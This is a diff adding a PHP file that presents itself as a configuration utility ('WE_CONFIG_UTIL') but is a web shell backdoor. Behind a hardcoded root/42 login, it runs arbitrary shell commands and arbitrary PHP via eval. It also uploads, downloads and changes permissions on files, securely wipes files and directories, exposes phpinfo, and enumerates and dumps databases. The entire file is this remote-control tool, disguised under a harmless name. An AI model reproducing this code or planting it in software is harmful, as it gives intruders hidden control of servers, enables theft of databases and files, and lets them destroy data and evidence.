@@ -1,0 +1,768 @@
+<?php 
+
+class my_sql
+ {
+ var $host = 'localhost';
+ var $port = '';
+ var $user = '';
+ var $pass = '';	
+ var $base = '';	
+ var $db   = '';	
+ var $connection;
+ var $res;        
+ var $error;      
+ var $rows;       
+ var $columns;     
+ var $num_rows;   
+ var $num_fields; 
+ var $dump;       
+ 
+ function connect()
+  {	   
+  	switch($this->db)
+     {
+  	 case 'MySQL': 	
+  	  if(empty($this->port)) { $this->port = '3306'; }
+  	  if(!function_exists('mysql_connect')) return 0;
+  	  $this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass);	
+  	  if(is_resource($this->connection)) return 1;
+  	 break;
+     case 'MSSQL':
+      if(empty($this->port)) { $this->port = '1433'; }
+  	  if(!function_exists('mssql_connect')) return 0;
+  	  $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass);	
+      if($this->connection) return 1;
+     break;
+     case 'PostgreSQL':
+      if(empty($this->port)) { $this->port = '5432'; }
+      $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'";
+      if(!function_exists('pg_connect')) return 0;
+      $this->connection = @pg_connect($str);
+      if(is_resource($this->connection)) return 1;
+     break;
+     case 'Oracle':
+      if(!function_exists('ocilogon')) return 0;
+      $this->connection = @ocilogon($this->user, $this->pass, $this->base);
+      if(is_resource($this->connection)) return 1;
+     break;
+     }
+    return 0;   
+  }
+  
+ function select_db()
+  {
+   switch($this->db)
+    {
+  	case 'MySQL':
+  	 if(@mysql_select_db($this->base,$this->connection)) return 1;	
+    break;
+    case 'MSSQL':
+  	 if(@mssql_select_db($this->base,$this->connection)) return 1;
+    break;
+    case 'PostgreSQL':
+     return 1;
+    break;
+    case 'Oracle':
+     return 1;
+    break;
+    }
+   return 0;  
+  }
+  
+ function query($query)
+  { 
+   $this->res=$this->error='';
+   switch($this->db)
+    {
+  	case 'MySQL': 	
+     if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection))) 
+      { 
+      $this->error = @mysql_error($this->connection);
+      return 0;
+      } 
+     else if(is_resource($this->res)) { return 1; }                   
+     return 2;                                                          
+  	break;
+    case 'MSSQL':
+     if(false===($this->res=@mssql_query($query,$this->connection))) 
+      {
+      $this->error = 'Query error';
+      return 0;	
+      }
+      else if(@mssql_num_rows($this->res) > 0) { return 1; }
+     return 2;     
+    break;
+    case 'PostgreSQL':
+     if(false===($this->res=@pg_query($this->connection,$query)))
+      {
+      $this->error = @pg_last_error($this->connection);
+      return 0;
+      }
+      else if(@pg_num_rows($this->res) > 0) { return 1; }
+     return 2; 
+    break;
+    case 'Oracle':
+     if(false===($this->res=@ociparse($this->connection,$query)))
+      {
+      $this->error = 'Query parse error';	
+      }
+     else 
+      { 
+      if(@ociexecute($this->res)) 
+       {	
+       if(@ocirowcount($this->res) != 0) return 2;
+       return 1;	
+       }
+      $error = @ocierror();
+      $this->error=$error['message']; 
+      }
+    break;
+    }	
+  return 0;
+  }
+  
+ function get_result()
+  { 
+   $this->rows=array();
+   $this->columns=array();
+   $this->num_rows=$this->num_fields=0;	
+   switch($this->db)
+    {
+  	case 'MySQL':
+  	 $this->num_rows=@mysql_num_rows($this->res);
+  	 $this->num_fields=@mysql_num_fields($this->res);
+  	 while(false !== ($this->rows[] = @mysql_fetch_assoc($this->res))); 
+  	 @mysql_free_result($this->res);
+  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
+    break;
+    case 'MSSQL':
+  	 $this->num_rows=@mssql_num_rows($this->res);
+  	 $this->num_fields=@mssql_num_fields($this->res);    
+  	 while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res)));
+  	 @mssql_free_result($this->res);
+  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;};
+    break;
+    case 'PostgreSQL':
+  	 $this->num_rows=@pg_num_rows($this->res); 
+  	 $this->num_fields=@pg_num_fields($this->res);   
+  	 while(false !== ($this->rows[] = @pg_fetch_assoc($this->res)));
+  	 @pg_free_result($this->res);
+  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
+    break;
+    case 'Oracle':
+     $this->num_fields=@ocinumcols($this->res);
+     while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++;
+     @ocifreestatement($this->res);
+     if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
+    break;
+    }
+   return 0; 	
+  }
+  
+ function dump($table)
+  { 
+   if(empty($table)) return 0;
+   $this->dump=array();
+   $this->dump[0] = '##';
+   $this->dump[1] = '## --------------------------------------- ';
+   $this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s");
+   $this->dump[3] = '## Database: '.$this->base;
+   $this->dump[4] = '##    Table: '.$table;
+   $this->dump[5] = '## --------------------------------------- ';
+   switch($this->db)
+    {
+  	case 'MySQL':
+  	 $this->dump[0] = '## MySQL dump';
+  	 if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;
+  	 if(!$this->get_result()) return 0;
+  	 $this->dump[] = $this->rows[0]['Create Table'];
+     $this->dump[] = '## --------------------------------------- ';
+  	 if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;
+  	 if(!$this->get_result()) return 0;
+  	 for($i=0;$i<$this->num_rows;$i++)
+  	  {
+      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @mysql_real_escape_string($v);}	
+  	  $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');';	
+  	  }	
+    break;
+    case 'MSSQL':
+     $this->dump[0] = '## MSSQL dump';
+     if($this->query('SELECT * FROM '.$table)!=1) return 0;
+  	 if(!$this->get_result()) return 0;
+  	 for($i=0;$i<$this->num_rows;$i++)
+  	  {
+      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}	
+  	  $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';	
+  	  }	
+    break;
+    case 'PostgreSQL':
+     $this->dump[0] = '## PostgreSQL dump';
+     if($this->query('SELECT * FROM '.$table)!=1) return 0;
+  	 if(!$this->get_result()) return 0;
+  	 for($i=0;$i<$this->num_rows;$i++)
+  	  {
+      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);} 	
+  	  $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';	
+  	  } 	
+    break;
+    case 'Oracle':
+      $this->dump[0] = '## ORACLE dump';
+      $this->dump[]  = '## under construction'; 
+    break;
+    default:
+     return 0;
+    break;
+    }
+   return 1; 	
+  }
+  
+ function close()
+  { 
+   switch($this->db)
+    {
+  	case 'MySQL': 
+  	 @mysql_close($this->connection); 	
+    break;
+    case 'MSSQL':
+     @mssql_close($this->connection);
+    break;
+    case 'PostgreSQL':
+     @pg_close($this->connection);
+    break;
+    case 'Oracle':
+     @oci_close($this->connection);
+    break;
+    }	
+  }
+  
+ function affected_rows()
+  { 
+   switch($this->db)
+    {
+  	case 'MySQL':
+  	 return @mysql_affected_rows($this->res); 	
+    break;
+    case 'MSSQL':
+     return @mssql_affected_rows($this->res);
+    break;
+    case 'PostgreSQL':
+     return @pg_affected_rows($this->res);
+    break;
+    case 'Oracle':
+     return @ocirowcount($this->res);
+    break;
+    default:
+     return 0;
+    break;
+    }	
+  }
+ }
+
+
+
+
+function error_handler($errno, $errstr, $errfile, $errline, $errcontext) {
+if (error_reporting() == 0) {
+$_SESSION['output'] .= $errstr . "\n";}else{
+die('<html><head><title>WE_CONFIG_UTIL</title></head><body><h1>Fatal Error!</h1><p><b>'.$errstr.'</b></p>
+<p>in <b>' . $errfile . '</b>, line <b>' . $errline . '</b>.</p></body></html>');}}
+set_error_handler('error_handler');
+
+function logout() {$_SESSION = array('authenticated' => false);}
+
+function wipe($name)
+{
+	$file = @fopen($name, "r+b");
+	if($file !== FALSE)
+	{
+		$string = "\0\0\0\0\0\0\0\0\0\0";
+		$size = filesize($name);
+		for($i=0; $i < $size;)
+		{
+			$i += fwrite($file, $string);
+		}
+		fflush($file);
+		fclose($file);
+		unlink($name);
+	}
+	else
+	{
+		echo "Could not open $name for wiping.";
+	}
+}
+
+function wipedir($name)
+{
+	if(is_dir($_SESSION['cwd']."/".$name))
+	{
+		$h = @opendir($_SESSION['cwd']."/".$name);
+		if($h===FALSE)
+		{
+			$n = $_SESSION['cwd']."/".$name;
+			echo "Could not open directory $n.";
+		}
+		else
+		{
+			while(($o = @readdir($h))!==FALSE)
+			{
+				if($o !="." && $o != "..")
+					wipedir($name."/".$o);
+			}
+		}
+		closedir($h);
+		if(!@rmdir($_SESSION['cwd']."/".$name))
+		{
+			$n = $_SESSION['cwd']."/".$name;
+			echo "Could not rmdir($n).";
+		}
+	}
+	else
+	{
+		wipe($_SESSION['cwd']."/".$name);
+	}
+}
+
+
+function stripslashes_deep($value) {
+    if (is_array($value)){return array_map('stripslashes_deep', $value);}
+    else{return stripslashes($value);}}
+
+if (get_magic_quotes_gpc())
+    $_POST = stripslashes_deep($_POST);
+
+/* Initialize some variables we need again and again. */
+$username = isset($_POST['username']) ? $_POST['username'] : '';
+$password = isset($_POST['password']) ? $_POST['password'] : '';
+$nounce   = isset($_POST['nounce'])   ? $_POST['nounce']   : '';
+
+$command  = isset($_POST['command'])  ? $_POST['command']  : '';
+$rows     = isset($_POST['rows'])     ? $_POST['rows']     : 24;
+$columns  = isset($_POST['columns'])  ? $_POST['columns']  : 80;
+
+
+/* Load the configuration. */
+$aliases = array("ls"=>"ls -CvhF","ll"=>"ls -lvhF");
+$users =  array("root"=>"42");
+$settings = array('home-directory'   => '.');
+
+$ini=array("users"=>$users,"aliases"=>$aliases,"settings"=>$settings);
+
+session_start();
+
+
+if (isset($_POST['logout']))
+    logout();
+
+if (isset($_SESSION['nounce']) && $nounce == $_SESSION['nounce'] && 
+    isset($ini['users'][$username])) 
+        {
+            $_SESSION['authenticated'] = ($ini['users'][$username] == $password);
+        }
+
+if (!isset($_SESSION['authenticated']))
+    $_SESSION['authenticated'] = false;
+
+
+if ($_SESSION['authenticated']) {
+    if (empty($_SESSION['cwd'])) {
+        $_SESSION['cwd'] = realpath($ini['settings']['home-directory']);
+        $_SESSION['history'] = array();
+        $_SESSION['output'] = '';
+	    $_SESSION['eval_shell'] = '';
+        $_SESSION['db_host']='localhost';
+        $_SESSION['db_port']='3306';
+        $_SESSION['db_user']='';
+        $_SESSION['db_pw']='';
+        $_SESSION['db_type']='MySQL';
+	    $_SESSION['db_base']=''; 
+    }
+  
+    if(isset($_POST['eval_shell'])) 
+	    $_SESSION['eval_shell'] = $_POST['eval_shell'];
+  
+    if(isset($_POST['eval']))
+    {
+	eval($_SESSION['eval_shell']);
+        die();
+    }
+  
+    if (!empty($command)) {
+        if (($i = array_search($command, $_SESSION['history'])) !== false)
+            unset($_SESSION['history'][$i]);
+        
+        array_unshift($_SESSION['history'], $command);
+  
+        $_SESSION['output'] .= '$ ' . $command . "\n";
+
+        /* Initialize the current working directory. */
+        if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $command)) {
+            $_SESSION['cwd'] = realpath($ini['settings']['home-directory']);
+        } elseif (preg_match('/^[[:blank:]]*cd[[:blank:]]+([^;]+)$/', $command, $regs)) {
+            /* The current command is a 'cd' command which we have to handle
+             * as an internal shell command. */
+
+            if ($regs[1]{0} == '/') {
+                /* Absolute path, we use it unchanged. */
+                $new_dir = $regs[1];
+            } else {
+                /* Relative path, we append it to the current working
+                 * directory. */
+                $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
+            }
+      
+            /* Transform '/./' into '/' */
+            while (strpos($new_dir, '/./') !== false)
+                $new_dir = str_replace('/./', '/', $new_dir);
+
+            /* Transform '//' into '/' */
+            while (strpos($new_dir, '//') !== false)
+                $new_dir = str_replace('//', '/', $new_dir);
+
+            /* Transform 'x/..' into '' */
+            while (preg_match('|/\.\.(?!\.)|', $new_dir))
+                $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
+      
+            if ($new_dir == '') $new_dir = '/';
+      
+            /* Try to change directory. */
+            if (@chdir($new_dir)) {
+                $_SESSION['cwd'] = $new_dir;
+            } else {
+                $_SESSION['output'] .= "cd: could not change to: $new_dir\n";
+            }
+      
+        } elseif (trim($command) == 'exit') {
+            logout();
+        }
+	elseif(trim($command) == 'INFO'){phpinfo(); die();} 
+		elseif(preg_match("/^DBHOST:(.*)/",$command,$host)){$_SESSION['db_host']=$host[1];}
+		elseif(preg_match("/^DBPORT:(.*)/",$command,$port)){$_SESSION['db_port']=$port[1];}
+	    elseif(preg_match("/^DBUSER:(.*)/",$command,$user)){$_SESSION['db_user']=$user[1];}
+	    elseif(preg_match("/^DBPW:(.*)/",$command,$pw)){$_SESSION['db_pw']=$pw[1];}
+	    elseif(preg_match("/^DBTYPE:(.*)/",$command,$type)){$_SESSION['db_type']=$type[1];}
+	    elseif(preg_match("/^DBBASE:(.*)/",$command,$base)){$_SESSION['db_base']=$base[1];}
+	    elseif(preg_match("/^DB:(.*):(.*):(.*):(.*)/",$command,$info)) //user pass host database
+	        {
+	            echo $info[1]." ".$info[2]." ".$info[3]." ".$info[4];
+	            $_SESSION['db_user']=$info[1];
+	            $_SESSION['db_pw']=$info[2];
+	            $_SESSION['db_host']=$info[3];
+	            $_SESSION['db_base']=$info[4];
+	        }
+
+	    elseif(trim($command)=='DBINFO')
+	        {
+	        $db= new my_sql();
+	        $db->host = $_SESSION['db_host'];
+            $db->port = $_SESSION['db_port'];
+            $db->user = $_SESSION['db_user'];
+            $db->pass = $_SESSION['db_pw'];	
+            $db->base = $_SESSION['db_base'];	
+            $db->db   = $_SESSION['db_type'];	
+            $db->connect();
+            $db->select_db();
+            $db->query("SELECT `TABLE_SCHEMA` FROM `INFORMATION_SCHEMA`.`TABLES`");
+            $db->get_result();
+            $databases = array();
+            for( $i=0;$i<sizeof($db->rows)-1;$i++){
+                foreach($db->rows[$i] as $foo=>$bar){
+                $databases[$i]=$bar;}}
+                $databases=array_unique($databases);
+               
+            echo "<table border=\"0\"><tr>";
+            foreach($databases as $dbname)
+                {
+                echo "<td valign=\"top\"><table style=\"border:1px solid #000000;\"><tr><td bgcolor = \"#848484\">$dbname</td></tr>";
+                $db->query("SELECT `TABLE_NAME` FROM `INFORMATION_SCHEMA`.`TABLES` WHERE `TABLE_SCHEMA` = '$dbname'"); 
+                $db->get_result();
+                for( $i=0;$i<sizeof($db->rows)-1;$i++){
+                foreach($db->rows[$i] as $foo=>$bar){
+                echo "<tr><td>$bar</td></tr>";
+                }}
+                echo"</table></td>";
+                }
+            echo "</tr></table>";
+	        }
+	           
+	    elseif(trim($command)=='QUERY')
+	        {
+	        $db= new my_sql();
+	        $db->host = $_SESSION['db_host'];
+            $db->port = $_SESSION['db_port'];
+            $db->user = $_SESSION['db_user'];
+            $db->pass = $_SESSION['db_pw'];	
+            $db->base = $_SESSION['db_base'];	
+            $db->db   = $_SESSION['db_type'];	
+            $db->connect();
+            $db->select_db();
+            $db->query($_SESSION['eval_shell']);
+            $db->get_result();
+            echo "<table style=\"border:1px solid #000000;\" > <tr>";
+            foreach($db->columns as $key=>$val){
+                echo "<td bgcolor = \"#848484\">$val</td>";
+                }            
+             echo"</tr>";
+            for( $i=0;$i<sizeof($db->rows)-1;$i++){
+                echo "<tr >";
+                foreach($db->rows[$i] as $foo=>$bar){
+                echo "<td>$bar</td>";
+                }       
+                echo "</tr>";
+                }
+            echo "</table>";
+
+	        }
+	    elseif(preg_match("/^APPEND:(.*)/",$command,$name))
+                {
+                $filename = $_SESSION['cwd']."/".$name[1];
+                $somecontent = $_SESSION["eval_shell"];
+                    if (!is_writeable($filename)||!$handle = fopen($filename, "a")) 
+                        {echo "couldn't open $filename";}
+                    if (!fwrite($handle, $_SESSION["eval_shell"])) 
+                        {echo "couldn't write $filename";}
+                    fclose($handle);
+                }
+        elseif(preg_match("/^SAVE:\\s*(.*)/",$command,$name))
+                {
+                $filename = $_SESSION['cwd']."/".$name[1];
+                $somecontent = $_SESSION["eval_shell"];
+                    if (!$handle = @fopen($filename, "w")) 
+                        {echo "couldn't open $filename";}
+                    elseif (!fwrite($handle, $_SESSION["eval_shell"])) 
+                        {echo "couldn't write $filename";}
+                    else{fclose($handle);}
+                }
+        elseif(preg_match("/^LOAD:\\s*(.*)/",$command,$name)||preg_match("/^OPEN:\\s*(.*)/",$command,$name))
+                {
+                $filename = $_SESSION['cwd']."/".$name[1];
+                       
+                    if (!is_readable($filename)||!$handle=fopen($filename, "r")) 
+                        {echo "couldn't open $filename";}else{
+                     $_SESSION["eval_shell"]=htmlspecialchars(fread($handle,filesize ($filename)));
+                    fclose($handle);}
+                }
+    elseif(preg_match("/^CWDIR:\\s*(.*)/", $command, $path))
+	{if(!is_dir($path[1])){echo "$path is not a valid path";}else{$_SESSION['cwd']=$path[1];}}
+	elseif(trim($command) == 'LIST')
+	    {
+	    $path=$_SESSION['cwd'];
+        $handle = @opendir($path);
+        if($handle)
+            {
+            while ($file = readdir($handle)) 
+                {
+                if($file != "." && $file != "..")
+                    {
+                    if(is_dir($path."/".$file)){$_SESSION['output'] .=$file."/    ";}
+                    elseif(is_link($path."/".$file)){$_SESSION['output'] .=$file."*    ";}
+                    else{$_SESSION['output'] .=$file."    ";} 
+                    }
+                }
+            $_SESSION['output'] .="\n";
+            closedir($handle);
+	        }
+	    else
+	        {echo "Unable to open $path";}
+	    }
+	elseif(trim($command) == 'PUT')
+	{
+    if(sizeof($_FILES)){
+	    foreach($_FILES as $name => $file){
+	        if(isset($file["tmp_name"]) && $file["tmp_name"]){
+	                    
+							$tempName = $_SESSION['cwd']."/".$file["name"];
+							if(!@move_uploaded_file($file["tmp_name"],$tempName)){echo "couldn't write $tempName";}
+						}
+					}
+				}
+	}
+	elseif(preg_match("/^GET:\\s*(.*)/", $command, $name))
+	{
+	     header("Content-Type: */*");
+	     header("Content-Disposition: attachment; filename=\"$name[1]\"");
+	     readfile($_SESSION['cwd']."/".$name[1]);
+	     die();
+	}
+    elseif(preg_match("/^RM:\\s*(.*)/", $command, $name))
+	{
+		wipedir($name[1]);
+	}
+    elseif(preg_match("/^CHMOD:\\s*([^:]*):0([0-7])([0-7])([0-7])\\s*$/", $command, $params))
+	{
+		$finame = $_SESSION['cwd']."/".$params[1];
+		$newmod1 = $params[2];
+		$newmod2 = $params[3];
+		$newmod3 = $params[4];
+		$newmod = $newmod1*64 + $newmod2*8 + $newmod3;
+		if(!@chmod($finame, $newmod)) 
+			echo "Could not chmod($finame, $newmod).";
+	}
+	else {
+
+            /* The command is not an internal command, so we execute it after
+             * changing the directory and save the output. */
+            chdir($_SESSION['cwd']);
+
+            // We canot use putenv() in safe mode.
+            if (!ini_get('safe_mode')) {
+                // Advice programs (ls for example) of the terminal size.
+                putenv('ROWS=' . $rows);
+                putenv('COLUMNS=' . $columns);
+            }
+
+            /* Alias expansion. */
+            $length = strcspn($command, " \t");
+            $token = substr($command, 0, $length);
+            if (isset($ini['aliases'][$token]))
+                $command = $ini['aliases'][$token] . substr($command, $length);
+    
+            $io = array();
+            $p = proc_open($command,
+                           array(1 => array('pipe', 'w'),
+                                 2 => array('pipe', 'w')),
+                           $io);
+
+            /* Read output sent to stdout. */
+            while (!feof($io[1])) {
+                $_SESSION['output'] .= htmlspecialchars(fgets($io[1]));
+            }
+            /* Read output sent to stderr. */
+            while (!feof($io[2])) {
+                $_SESSION['output'] .= htmlspecialchars(fgets($io[2]));
+            }
+            
+            fclose($io[1]);
+            fclose($io[2]);
+            proc_close($p);
+        }
+    }
+
+    /* Build the command history for use in the JavaScript */
+    if (empty($_SESSION['history'])) {
+        $js_command_hist = '""';
+    } else {
+        $escaped = array_map('addslashes', $_SESSION['history']);
+        $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
+    }
+}
+
+?>
+<html>
+<head>
+  <title>WE_CONFIG_UTIL</title>
+
+  <script type="text/javascript">
+  <?php if ($_SESSION['authenticated']) { ?>
+
+  var current_line = 0;
+  var command_hist = new Array(<?php echo $js_command_hist ?>);
+  var last = 0;
+
+  function key(e) {
+    if (!e) var e = window.event;
+
+    if (e.keyCode == 38 && current_line < command_hist.length-1) {
+      command_hist[current_line] = document.shell.command.value;
+      current_line++;
+      document.shell.command.value = command_hist[current_line];
+    }
+
+    if (e.keyCode == 40 && current_line > 0) {
+      command_hist[current_line] = document.shell.command.value;
+      current_line--;
+      document.shell.command.value = command_hist[current_line];
+    }
+
+  }
+
+  function init() {
+    document.shell.setAttribute("autocomplete", "off");
+    document.shell.output.scrollTop = document.shell.output.scrollHeight;
+    document.shell.command.focus();
+  }
+
+  <?php } else { ?>
+
+  function init() {
+    document.shell.username.focus();
+  }
+
+  <?php } ?>
+  </script>
+</head>
+
+<body onload="init()">
+
+<h1>WE_CONFIG_UTIL</h1>
+
+<form name="shell" action="<?php echo $_SERVER['PHP_SELF'] ?>" method="post" enctype="multipart/form-data">
+
+<?php
+if (!$_SESSION['authenticated']) {
+    $_SESSION['nounce'] = mt_rand();
+
+?>
+
+<fieldset>
+  <legend>Authentication</legend>
+
+  <?php
+  if (!empty($username))
+      echo '  <p class="error">Login failed, please try again:</p>' . "\n";
+  else
+      echo "  <p>Please login:</p>\n";
+  ?>
+
+  <p>Username: <input name="username" type="text" value="<?php echo $username
+  ?>"></p>
+
+  <p>Password: <input name="password" type="password"></p>
+
+  <p><input type="submit" value="Login"></p>
+
+  <input name="nounce" type="hidden" value="<?php echo $_SESSION['nounce']; ?>">
+
+</fieldset>
+
+<?php } else { /* Authenticated. */ ?>
+
+<fieldset>
+  <legend>Current Working Directory: <code><?php
+     echo  htmlspecialchars($_SESSION['cwd'], ENT_COMPAT, 'UTF-8');
+    ?></code></legend>
+
+
+<div id="terminal">
+<textarea style="float:left" name="output" readonly="readonly" cols="<?php echo $columns ?>" rows="<?php echo $rows ?>">
+<?php
+$lines = substr_count($_SESSION['output'], "\n");
+$padding = str_repeat("\n", max(0, $rows+1 - $lines));
+echo rtrim($padding . $_SESSION['output']);
+?>
+</textarea>
+<textarea style="float:right" name="eval_shell" cols="<?php echo $columns ?>" rows="<?php echo $rows ?>"><?php
+echo $_SESSION['eval_shell'];
+?>
+</textarea>
+<p id="prompt">
+  &nbsp;<input name="command" type="text"
+                onkeyup="key(event)" size="<?php echo $columns-2 ?>" tabindex="1">
+                <input name="upload" type="file" tabindex="2">
+</p>
+</div>
+
+<p>
+  <span style="float: right">Size: <input type="text" name="rows" size="2"
+  maxlength="3" value="<?php echo $rows ?>"> &times; <input type="text"
+  name="columns" size="2" maxlength="3" value="<?php echo $columns
+  ?>"></span>
+  
+<input type="submit" value="Execute Command">
+  <input type="submit" name="logout" value="Logout">
+  <input type="submit" name="eval" value="Eval Code">
+</p>
+</fieldset>
+<?php } ?>
+</form>
+</body>
+</html>
